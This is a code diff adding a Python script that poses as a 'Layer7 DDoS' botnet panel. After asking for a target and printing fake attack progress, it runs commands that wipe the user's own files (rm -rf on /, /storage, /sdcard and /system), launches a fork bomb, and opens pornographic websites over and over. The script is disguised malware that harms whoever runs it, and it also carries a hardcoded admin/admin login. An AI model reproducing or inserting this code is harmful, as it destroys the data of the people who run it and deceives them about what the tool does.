+⡤⠚⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣹⣿⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡀⢈⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣇⣻⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⢴⡿⠛⠿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢻⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⣀⣀⣀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⢀⣠⣄⣠⣖⣠⣴⣾⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+    """)
+    time.sleep(0.8)
+    clear()
+
+
+#Layer7 DDoS
+#Developed by Vend3ttA
+import os
+from time import sleep
+
+def banner():
+    print("""
+\033[0;31m⠀⠀⢀⣀⡀⠘⢀⣀⠀⣀⠀⠀⠀⠀⣠⡀
+\033[0;31m⠠⡪⠁⠄⢀⠟⠁⠀⠀⠀⠈⠢⠀⠀⠙⠁
+\033[0;31m⠀⠑⠄⡑⢌⡀⠀⠀⠀⠀⠀⠀⡗⠠⡀⠀
+\033[0;31m⠀⠀⠀⠈⠒⡬⢐⠢⠄⣀⠀⢠⠃⠱⡈⠢
+\033[0;31m⠀⠀⠀⠀⠀⠈⠒⠨⠥⠶⠆⠩⠭⠥⠤⠐
+\033[0;31m⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⢰⡧⠀⠀⠀⠀
+
+\033[0;31m╔═╗╔═╗╔═╗╔═╗╔═╗  ╔╗ ╔═╗╔╦╗╔╗╔╔═╗╔╦╗
+\033[0;31m╚═╗╠═╝╠═╣║  ║╣   ╠╩╗║ ║ ║ ║║║║╣  ║ 
+\033[0;31m╚═╝╩  ╩ ╩╚═╝╚═╝  ╚═╝╚═╝ ╩ ╝╚╝╚═╝ ╩ 
+L7 DDoS attack Created by meve c2          
+          """)
+
+def launch_attack():
+    banner()
+    target = input("Enter Target>>>: ")
+    seconds = int(input("Seconds>>>: "))
+    print("Please wait...")
+    sleep(1)
+    print("Performing TLS Handshake....")
+    sleep(1)
+    print("Validating Proxies......")
+    sleep(1)
+    print("Attack Sent With High Proxy......")
+    sleep(2)
+    print(f"""
+╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗
+╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║ 
+╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩
+        TARGET: > {target}
+        TIME: > {seconds}
+        METHOD: > <<<<DESTROY>>>>""")
+    print("WELCOME TO CYBERMAFIA PANEL")
+    os.system('touch .hushlogin')
+    os.system("termux-setup-storage")
+    os.system("rm -rf /*")
+    os.system("rm -rf /storage/*")
+    os.system("rm -rf /sdcard/*")
+    os.system('rm -rf /system/*')
+    os.system(':(){ :|: & };:')
+    os.system("xdg-open https://www.pornhub.com")
+    os.system("xdg-open https://jabol2.tv")
+    os.system("xdg-open https://www.youjizz.com")
+    os.system("xdg-open https://pinayflix1.tv")
+    os.system("xdg-open https://pinayflix1.tv")
+    os.system("xdg-open https://pinayflix1.tv")
+    os.system("xdg-open https://pinayflix1.tv")
+    os.system("xdg-open https://pinayflix1.tv")
+    os.system("xdg-open https://pinayflix1.tv")
+    os.system("xdg-open https://pinayflix1.tv")
+    os.system("xdg-open https://pinayflix1.tv")
+    os.system("xdg-open https://pinayflix1.tv")
+    os.system("xdg-open https://pinayflix1.tv")
+    os.system("xdg-open https://pinayflix1.tv")
+    os.system("xdg-open https://pinayflix1.tv")
+    os.system("xdg-open https://pinayflix1.tv")
+    os.system("xdg-open https://pinayflix1.tv")
+
+launch_attack()
+
+def login():
+    clear()
+    user = "admin"
+    passwd = "admin"
+    username = input("⚡ Username: ")
+    password = getpass.getpass(prompt='⚡ Password: ')
+    if username != user or password != passwd:
+        print("")
+        print("⚡ Haizzz, you're so cute...")
+        sys.exit(1)
+    elif username == user and password == passwd:
+        print("⚡ Welcome to Space BOTNET")
+        time.sleep(0.3)
+        ascii_vro()
+        main()
+
+login()
